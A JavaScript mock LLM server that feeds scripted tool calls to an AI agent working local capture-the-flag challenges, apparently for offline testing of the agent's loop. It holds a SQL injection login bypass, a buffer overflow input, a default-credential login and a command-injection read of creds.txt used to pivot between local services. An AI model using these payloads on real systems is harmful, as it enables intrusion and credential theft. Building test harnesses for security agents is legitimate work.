'use strict';

/**
 * Mock LLM 服务器：模拟 OpenAI 兼容的 /chat/completions 函数调用响应，
 * 用于离线验证 AI 代理主循环（工具执行/结果回填/flag 提交）。
 *
 * 用法（终端 A）:  node scripts/mock-llm.js
 * 用法（终端 B）:  LLM_API_KEY=test LLM_BASE_URL=http://127.0.0.1:18000/v1 LLM_MODEL=mock \
 *                  node agent/agent.js --all
 */
const http = require('http');

const PORT = 18000;

// ---------- 从 system 提示中解析挑战信息 ----------
function parseChallenge(messages) {
  const sys = messages.find((m) => m.role === 'system')?.content || '';
  const id = sys.match(/"id"\s*:\s*"([^"]+)"/)?.[1];
  const url = sys.match(/"url"\s*:\s*"(http:[^"]+)"/)?.[1];
  return id && url ? { id, url } : null;
}

/** 解析工具结果（http_request 的返回体是嵌套 JSON 字符串） */
function respBody(content) {
  try {
    const outer = JSON.parse(content);
    if (outer && typeof outer.body === 'string') {
      try { return JSON.parse(outer.body); } catch { return outer.body; }
    }
    return outer;
  } catch {
    return content;
  }
}

function lastToolContent(messages) {
  const t = [...messages].reverse().find((m) => m.role === 'tool');
  return t ? t.content : '';
}

function extractFlag(text) {
  const m = String(text).match(/flag\{[^}"]+\}/);
  return m ? m[0] : null;
}

// 每个挑战的"攻击剧本"：根据上下文决定下一步工具调用
const PLAYS = {
  'web-sqli': (ch) => [
    {
      name: 'http_request',
      args: { url: `${ch.url}/login?username=admin&password=${encodeURIComponent("' OR 1=1 -- ")}` }
    },
    {
      name: 'submit_flag',
      args: (ctx) => {
        const flag = extractFlag(lastToolContent(ctx.messages));
        return { challenge_id: ch.id, flag };
      }
    }
  ],
  'crypto-xor': (ch) => [
    { name: 'http_request', args: { url: `${ch.url}/challenge` } },
    {
      name: 'run_command',
      args: (ctx) => {
        const hex = respBody(lastToolContent(ctx.messages))?.cipher_hex || '';
        return { command: `python3 -c "d=bytes.fromhex('${hex}');print([bytes([b^k for b in d]).decode() for k in range(256) if bytes([b^k for b in d]).startswith(b'flag{')][0])"` };
      }
    },
    {
      name: 'submit_flag',
      args: (ctx) => ({ challenge_id: ch.id, flag: extractFlag(lastToolContent(ctx.messages)) })
    }
  ],
  'bin-overflow': (ch) => [
    {
      name: 'http_request',
      args: {
        url: `${ch.url}/run`,
        method: 'POST',
        json: { input: Buffer.from('A'.repeat(44) + 'DCBA').toString('base64') }
      }
    },
    {
      name: 'submit_flag',
      args: (ctx) => ({ challenge_id: ch.id, flag: extractFlag(lastToolContent(ctx.messages)) })
    }
  ],
  'net-pivot': (ch) => {
    const base = parseInt(new URL(ch.url).port, 10);
    return [
      { name: 'http_request', args: { url: `http://127.0.0.1:${base}/login?user=admin&pass=123456` } },
      {
        name: 'http_request',
        args: (ctx) => {
          const token = respBody(lastToolContent(ctx.messages))?.token;
          return { url: `http://127.0.0.1:${base + 1}/cmd?c=cat%20creds.txt`, headers: { 'X-Auth-Token': token } };
        }
      },
      {
        name: 'http_request',
        args: (ctx) => {
          const body = lastToolContent(ctx.messages);
          const tokenB = /tokenB=([0-9a-f]+)/.exec(respBody(body))?.[1];
          return { url: `http://127.0.0.1:${base + 2}/`, headers: { 'X-Auth-Token': tokenB } };
        }
      },
      {
        name: 'submit_flag',
        args: (ctx) => ({ challenge_id: ch.id, flag: extractFlag(lastToolContent(ctx.messages)) })
      }
    ];
  }
};

function callTool(name, args) {
  return {
    type: 'function',
    function: { name, arguments: JSON.stringify(args) }
  };
}

const server = http.createServer((req, res) => {
  let raw = '';
  req.on('data', (d) => (raw += d));
  req.on('end', () => {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    const body = JSON.parse(raw);
    const messages = body.messages;
    const ch = parseChallenge(messages);
    const play = ch ? PLAYS[ch.id] : null;

    let message;
    if (!play) {
      message = { role: 'assistant', content: '该挑战没有预设剧本，结束。' };
    } else {
      const steps = play(ch);
      const idx = messages.filter((m) => m.role === 'assistant' && m.tool_calls).length;
      const step = steps[idx];
      if (!step) {
        message = { role: 'assistant', content: '全部步骤完成。' };
      } else {
        const args = typeof step.args === 'function' ? step.args({ messages }) : step.args;
        if (args && !args.flag) {
          console.log(`[mock] ${ch.id} step${idx}: ${step.name} ${JSON.stringify(args).slice(0, 120)}`);
        }
        message = { role: 'assistant', content: null, tool_calls: [callTool(step.name, args)] };
      }
    }
    res.end(JSON.stringify({ choices: [{ message }] }));
  });
});

server.listen(PORT, '127.0.0.1', () => {
  console.log(`[mock-llm] 监听 http://127.0.0.1:${PORT}/v1/chat/completions`);
});
